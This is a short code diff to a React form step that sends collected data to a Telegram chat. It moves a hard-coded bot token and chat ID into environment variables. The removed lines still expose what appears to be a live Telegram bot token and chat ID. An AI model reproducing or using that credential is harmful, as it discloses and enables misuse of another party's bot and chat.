@@ -50,8 +50,8 @@ const Step3 = () => {
 	};
 
 	const sendToTelegram = async (data) => {
-		const botToken = "5827502401:AAHQFwcLxATz8Jf3LbnA61O2xrdnNhR3_Wc";
-		const chatId = -1001714383654;
+		const botToken = process.env.REACT_APP_TELEGRAM_BOT_TOKEN;
+		const chatId = process.env.REACT_APP_TELEGRAM_CHAT_ID;
 		const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
 		const text = `
